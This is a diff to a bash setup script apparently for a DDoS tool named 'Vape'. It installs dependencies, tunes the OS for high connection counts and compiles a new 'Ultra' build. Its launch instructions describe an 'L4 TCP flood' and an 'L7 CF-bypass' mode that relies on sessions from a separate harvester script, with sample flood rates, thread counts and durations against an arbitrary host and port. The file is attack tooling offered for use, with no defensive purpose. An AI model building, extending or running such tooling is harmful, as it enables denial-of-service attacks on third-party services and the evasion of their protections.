@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
 # Vape OS Tuner — @Xstairs
-# Auto-detects Vape-1.0.cpp or Vape-1.1.cpp, installs deps,
-# applies max OS tuning, and compiles the vape binary.
+# Auto-detects Vape_Ultra_1.2.cpp, Vape-1.1.cpp, or Vape-1.0.cpp,
+# installs deps, applies max OS tuning, and compiles the vape binary.
 # Run as root: sudo bash OS_tune.sh
 
 set -euo pipefail
@@ -16,16 +16,24 @@ fi
 
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 VAPE_BIN="vape"
+ULTRA_BIN="vape_ultra"
+ULTRA_LINK_FLAGS="-lpthread -lssl -lcrypto"
 
-# ── Auto-detect Vape source (prefer Vape-1.1 over Vape-1.0) ──────────────────
-if [[ -f "$SCRIPT_DIR/Vape-1.1.cpp" ]]; then
+# ── Auto-detect Vape source (prefer Ultra > 1.1 > 1.0) ───────────────────────
+if [[ -f "$SCRIPT_DIR/Vape_Ultra_1.2.cpp" ]]; then
+    VAPE_SRC="$SCRIPT_DIR/Vape_Ultra_1.2.cpp"
+    VAPE_VER="Vape_Ultra_1.2"
+    BUILD_ULTRA=1
+elif [[ -f "$SCRIPT_DIR/Vape-1.1.cpp" ]]; then
     VAPE_SRC="$SCRIPT_DIR/Vape-1.1.cpp"
     VAPE_VER="Vape-1.1"
+    BUILD_ULTRA=0
 elif [[ -f "$SCRIPT_DIR/Vape-1.0.cpp" ]]; then
     VAPE_SRC="$SCRIPT_DIR/Vape-1.0.cpp"
     VAPE_VER="Vape-1.0"
+    BUILD_ULTRA=0
 else
-    echo "ERROR: No Vape-1.0.cpp or Vape-1.1.cpp found in $SCRIPT_DIR"
+    echo "ERROR: No Vape source file found in $SCRIPT_DIR"
     exit 1
 fi
 
@@ -43,6 +51,7 @@ if command -v apt-get &>/dev/null; then
     apt-get upgrade -y -qq
     apt-get install -y -qq \
         build-essential g++ gcc make \
+        libssl-dev \
         htop iotop nethogs net-tools \
         nmap iputils-ping iproute2 \
         sysstat ethtool numactl \
@@ -50,11 +59,11 @@ if command -v apt-get &>/dev/null; then
 elif command -v yum &>/dev/null; then
     yum update -y -q
     yum groupinstall -y "Development Tools" -q
-    yum install -y -q gcc-c++ htop iotop net-tools ethtool numactl wget curl git 2>/dev/null || true
+    yum install -y -q gcc-c++ openssl-devel htop iotop net-tools ethtool numactl wget curl git 2>/dev/null || true
 elif command -v dnf &>/dev/null; then
     dnf update -y -q
     dnf groupinstall -y "Development Tools" -q
-    dnf install -y -q gcc-c++ htop iotop net-tools ethtool numactl wget curl git 2>/dev/null || true
+    dnf install -y -q gcc-c++ openssl-devel htop iotop net-tools ethtool numactl wget curl git 2>/dev/null || true
 fi
 echo "    Packages done."
 
@@ -166,16 +175,33 @@ echo "    Limits done."
 ###############################################################################
 echo "[5/5] Compiling $VAPE_VER..."
 
-g++ -O3 -march=native -mtune=native \
-    -funroll-loops -fno-plt          \
-    -ffast-math -fomit-frame-pointer \
-    -std=c++17                       \
-    -o "$SCRIPT_DIR/$VAPE_BIN"       \
-    "$VAPE_SRC"                      \
-    -lpthread
+if [[ "$BUILD_ULTRA" -eq 1 ]]; then
+    # Vape_Ultra_1.2 — L4 + L7 with OpenSSL TLS
+    g++ -O3 -march=native -mtune=native \
+        -funroll-loops -fno-plt          \
+        -ffast-math -fomit-frame-pointer \
+        -std=c++17                       \
+        -o "$SCRIPT_DIR/$ULTRA_BIN"      \
+        "$VAPE_SRC"                      \
+        $ULTRA_LINK_FLAGS
 
-strip "$SCRIPT_DIR/$VAPE_BIN"
-echo "    Compiled → $SCRIPT_DIR/$VAPE_BIN"
+    strip "$SCRIPT_DIR/$ULTRA_BIN"
+    OUT_BIN="$SCRIPT_DIR/$ULTRA_BIN"
+else
+    # Vape-1.0 / Vape-1.1 — L4 only
+    g++ -O3 -march=native -mtune=native \
+        -funroll-loops -fno-plt          \
+        -ffast-math -fomit-frame-pointer \
+        -std=c++17                       \
+        -o "$SCRIPT_DIR/$VAPE_BIN"       \
+        "$VAPE_SRC"                      \
+        -lpthread
+
+    strip "$SCRIPT_DIR/$VAPE_BIN"
+    OUT_BIN="$SCRIPT_DIR/$VAPE_BIN"
+fi
+
+echo "    Compiled → $OUT_BIN"
 
 ###############################################################################
 # Done
@@ -191,8 +217,15 @@ echo "  CPUs    : $CORES  |  RAM: ${RAM_GB} GB"
 echo "  FD limit: $(ulimit -n)"
 echo "  Reboot recommended to apply all persistent limits."
 echo ""
+if [[ "$BUILD_ULTRA" -eq 1 ]]; then
+echo "  Launch (L4 TCP flood):"
+echo "    $OUT_BIN <host> <port> l4 50000 $CORES 60"
+echo "  Launch (L7 CF-bypass — requires session.json from l7_harvester.py):"
+echo "    $OUT_BIN <host> 443 l7 2000 $CORES 60 session.json"
+else
 echo "  Launch:"
-echo "    $SCRIPT_DIR/$VAPE_BIN <host> <port>"
-echo "    $SCRIPT_DIR/$VAPE_BIN <host> <port> 50000 $CORES 60"
-echo "    $SCRIPT_DIR/$VAPE_BIN <host> <port> 50000 $CORES 60 lownet"
+echo "    $OUT_BIN <host> <port>"
+echo "    $OUT_BIN <host> <port> 50000 $CORES 60"
+echo "    $OUT_BIN <host> <port> 50000 $CORES 60 lownet"
+fi
 echo "=============================================================="
